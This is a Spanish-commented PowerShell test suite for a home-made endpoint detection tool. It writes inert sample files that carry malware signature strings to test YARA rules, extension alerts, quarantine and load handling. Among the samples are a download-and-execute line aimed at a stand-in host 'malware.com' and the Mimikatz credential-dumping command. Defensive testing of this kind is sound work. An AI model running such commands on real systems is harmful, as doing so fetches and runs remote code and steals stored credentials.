# ═══════════════════════════════════════════════════════════════
#  🎯 SUITE COMPLETA DE TESTING - NEXO EDR
#  Ejecuta todos los escenarios de prueba automáticamente
# ═══════════════════════════════════════════════════════════════

param(
    [switch]$Quick,
    [switch]$Full
)

function Show-Banner {
    Clear-Host
    Write-Host "`n" -NoNewline
    Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║                                                            ║" -ForegroundColor Cyan
    Write-Host "║        🎯  NEXO EDR - SUITE DE TESTING AVANZADA  🎯        ║" -ForegroundColor Cyan
    Write-Host "║                                                            ║" -ForegroundColor Cyan
    Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
}

function Test-YaraDetection {
    Write-Host "`n[TEST 1] YARA Detection Engine" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════" -ForegroundColor Gray
    
    $testPath = "$env:USERPROFILE\Desktop\EDR_YARA_TEST"
    New-Item -Path $testPath -ItemType Directory -Force | Out-Null
    
    # Prueba 1: Mimikatz
    Write-Host "  ✓ Creando: mimikatz_sample.txt" -ForegroundColor White
    "mimikatz gentilkiwi sekurlsa::logonpasswords" | Out-File "$testPath\mimikatz_sample.txt"
    
    # Prueba 2: PowerShell malicioso
    Write-Host "  ✓ Creando: powershell_downloader.ps1" -ForegroundColor White
    "Invoke-WebRequest http://malware.com/payload | Invoke-Expression" | Out-File "$testPath\powershell_downloader.ps1"
    
    # Prueba 3: Ransomware
    Write-Host "  ✓ Creando: ransom_note.txt" -ForegroundColor White
    "Your files have been encrypted. Send bitcoin to decrypt ransom" | Out-File "$testPath\ransom_note.txt"
    
    Write-Host "`n  📊 Resultado esperado:" -ForegroundColor Cyan
    Write-Host "     • 3 archivos detectados" -ForegroundColor Gray
    Write-Host "     • 3 reglas YARA activadas" -ForegroundColor Gray
    Write-Host "     • 3 archivos en cuarentena`n" -ForegroundColor Gray
}

function Test-ExtensionDetection {
    Write-Host "`n[TEST 2] Dangerous Extension Detection" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════" -ForegroundColor Gray
    
    $testPath = "$env:USERPROFILE\Desktop\EDR_EXTENSION_TEST"
    New-Item -Path $testPath -ItemType Directory -Force | Out-Null
    
    $dangerousExts = @(".exe", ".dll", ".bat", ".cmd", ".ps1")
    
    foreach ($ext in $dangerousExts) {
        $filename = "test_file$ext"
        Write-Host "  ✓ Creando: $filename" -ForegroundColor White
        "This is a test file" | Out-File "$testPath\$filename"
    }
    
    Write-Host "`n  📊 Resultado esperado:" -ForegroundColor Cyan
    Write-Host "     • 5 archivos detectados por extensión" -ForegroundColor Gray
    Write-Host "     • Alertas en tiempo real (si Modo Monitor activo)`n" -ForegroundColor Gray
}

function Test-WatchdogRealtime {
    Write-Host "`n[TEST 3] Watchdog Real-Time Monitoring" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════" -ForegroundColor Gray
    
    Write-Host "`n  ⚠️  INSTRUCCIONES MANUALES:" -ForegroundColor Red
    Write-Host "  1. Inicia NEXO EDR en Modo Monitor (Opción 10)" -ForegroundColor White
    Write-Host "  2. Presiona Enter cuando esté listo..." -ForegroundColor White
    Read-Host
    
    $testPath = "$env:USERPROFILE\Desktop"
    
    Write-Host "`n  🔥 Creando archivo malicioso en 3... 2... 1..." -ForegroundColor Red
    Start-Sleep -Seconds 3
    
    "mimikatz" | Out-File "$testPath\THREAT_TEST.exe"
    
    Write-Host "`n  ✅ Archivo creado: THREAT_TEST.exe" -ForegroundColor Green
    Write-Host "  👀 Verifica el Dashboard - debería aparecer INMEDIATAMENTE`n" -ForegroundColor Cyan
}

function Test-QuarantineSystem {
    Write-Host "`n[TEST 4] Quarantine System" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════" -ForegroundColor Gray
    
    Write-Host "`n  📋 Verificando carpeta de cuarentena..." -ForegroundColor White
    
    $quarantinePath = "C:\Users\Memotito\OneDrive\Desktop\mini-edr\quarantine"
    
    if (Test-Path $quarantinePath) {
        $files = Get-ChildItem $quarantinePath
        Write-Host "  ✓ Cuarentena activa: $($files.Count) archivos" -ForegroundColor Green
        
        if ($files.Count -gt 0) {
            Write-Host "`n  🔒 Archivos en cuarentena:" -ForegroundColor Cyan
            foreach ($file in $files) {
                Write-Host "     • $($file.Name)" -ForegroundColor Gray
            }
        }
    }
    else {
        Write-Host "  ⚠️  Carpeta de cuarentena no encontrada" -ForegroundColor Yellow
        Write-Host "     (Se creará automáticamente al detectar la primera amenaza)" -ForegroundColor Gray
    }
    Write-Host ""
}

function Test-PerformanceStress {
    Write-Host "`n[TEST 5] Performance Stress Test" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════" -ForegroundColor Gray
    
    $testPath = "$env:USERPROFILE\Desktop\EDR_STRESS_TEST"
    New-Item -Path $testPath -ItemType Directory -Force | Out-Null
    
    Write-Host "`n  🔄 Creando 50 archivos maliciosos..." -ForegroundColor White
    
    1..50 | ForEach-Object {
        $filename = "malware_$_.exe"
        "mimikatz test file number $_" | Out-File "$testPath\$filename"
        if ($_ % 10 -eq 0) {
            Write-Host "     • Creados: $_/50" -ForegroundColor Gray
        }
    }
    
    Write-Host "`n  📊 Resultado esperado:" -ForegroundColor Cyan
    Write-Host "     • 50 detecciones YARA" -ForegroundColor Gray
    Write-Host "     • 50 archivos en cuarentena" -ForegroundColor Gray
    Write-Host "     • Tiempo de procesamiento < 30 segundos`n" -ForegroundColor Gray
}

function Show-Summary {
    Write-Host "`n╔════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║                   ✅ TESTS COMPLETADOS                      ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    
    Write-Host "`n📋 SIGUIENTE PASO - Ejecuta tu EDR:`n" -ForegroundColor Yellow
    Write-Host "   cd C:\Users\Memotito\OneDrive\Desktop\mini-edr" -ForegroundColor White
    Write-Host "   python main.py`n" -ForegroundColor White
    
    Write-Host "🎯 OPCIONES RECOMENDADAS:" -ForegroundColor Cyan
    Write-Host "   • Opción 4:  Escaneo completo de archivos" -ForegroundColor White
    Write-Host "   • Opción 10: Modo Monitor (ver detección en tiempo real)" -ForegroundColor White
    Write-Host "   • Opción 11: Ver archivos en cuarentena`n" -ForegroundColor White
    
    Write-Host "📊 CARPETAS DE PRUEBA CREADAS:" -ForegroundColor Cyan
    Write-Host "   • $env:USERPROFILE\Desktop\EDR_YARA_TEST" -ForegroundColor Gray
    Write-Host "   • $env:USERPROFILE\Desktop\EDR_EXTENSION_TEST" -ForegroundColor Gray
    Write-Host "   • $env:USERPROFILE\Desktop\EDR_STRESS_TEST`n" -ForegroundColor Gray
}

# ═══════════════════════════════════════════════════════════════
#  MAIN EXECUTION
# ═══════════════════════════════════════════════════════════════

Show-Banner

if ($Quick) {
    Write-Host "🚀 MODO RÁPIDO - Ejecutando tests básicos...`n" -ForegroundColor Cyan
    Test-YaraDetection
    Test-ExtensionDetection
    Test-QuarantineSystem
}
elseif ($Full) {
    Write-Host "🔥 MODO COMPLETO - Ejecutando todos los tests...`n" -ForegroundColor Red
    Test-YaraDetection
    Test-ExtensionDetection
    Test-WatchdogRealtime
    Test-QuarantineSystem
    Test-PerformanceStress
}
else {
    # Menú interactivo
    Write-Host "Selecciona el tipo de prueba:`n" -ForegroundColor White
    Write-Host "  1. Test Rápido (YARA + Extensiones)" -ForegroundColor Cyan
    Write-Host "  2. Test Completo (Todos los tests)" -ForegroundColor Cyan
    Write-Host "  3. Test Individual (seleccionar)" -ForegroundColor Cyan
    Write-Host "  4. Salir`n" -ForegroundColor Cyan
    
    $choice = Read-Host "Opción"
    
    switch ($choice) {
        "1" {
            Test-YaraDetection
            Test-ExtensionDetection
            Test-QuarantineSystem
        }
        "2" {
            Test-YaraDetection
            Test-ExtensionDetection
            Test-WatchdogRealtime
            Test-QuarantineSystem
            Test-PerformanceStress
        }
        "3" {
            Write-Host "`nTests individuales:" -ForegroundColor Yellow
            Write-Host "  1. YARA Detection" -ForegroundColor White
            Write-Host "  2. Extension Detection" -ForegroundColor White
            Write-Host "  3. Watchdog Real-time" -ForegroundColor White
            Write-Host "  4. Quarantine System" -ForegroundColor White
            Write-Host "  5. Performance Stress`n" -ForegroundColor White
            
            $testChoice = Read-Host "Test"
            switch ($testChoice) {
                "1" { Test-YaraDetection }
                "2" { Test-ExtensionDetection }
                "3" { Test-WatchdogRealtime }
                "4" { Test-QuarantineSystem }
                "5" { Test-PerformanceStress }
            }
        }
        "4" { exit }
    }
}

Show-Summary

Write-Host "✨ Presiona Enter para finalizar..." -ForegroundColor Cyan
Read-Host
